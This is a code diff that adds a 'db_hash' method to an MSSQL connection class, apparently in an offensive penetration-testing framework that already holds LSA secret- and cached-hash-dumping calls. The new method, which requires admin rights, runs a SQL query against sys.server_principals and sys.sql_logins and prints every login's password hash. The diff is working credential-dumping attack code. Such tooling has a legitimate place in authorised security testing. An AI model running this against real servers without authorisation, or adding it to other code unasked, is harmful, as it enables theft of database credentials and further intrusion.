@@ -625,3 +625,33 @@ class mssql(connection):
             )
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
+
+    @requires_admin
+    def db_hash(self):
+        self.logger.display("Dumping local database users' hashes")
+        query = """
+        SELECT
+            sp.name,
+            sl.password_hash
+        FROM sys.server_principals sp
+        LEFT JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id
+        WHERE sp.type IN ('S', 'U', 'G', 'C', 'K')
+        AND sp.name NOT LIKE '##%'
+        ORDER BY sp.name;
+        """
+        rows = self.conn.sql_query(query)
+        if self.conn.lastError:
+            self.logger.fail(f"Error running the SQL query: {self.conn.lastError}")
+            return
+        if not rows:
+            self.logger.display("No logins returned")
+            return
+        else:
+            self.logger.display("Enumerated logins")
+            self.logger.highlight(f"{'Login Name':<15} {'Database hash':<140}")
+            self.logger.highlight(f"{'----------':<15} {'----------':<140}")
+            for row in rows:
+                name = row.get("name")
+                password_hash = row.get("password_hash")
+                if password_hash != "NULL":
+                    self.logger.highlight(f"{name:<15} {password_hash.decode():<140}")
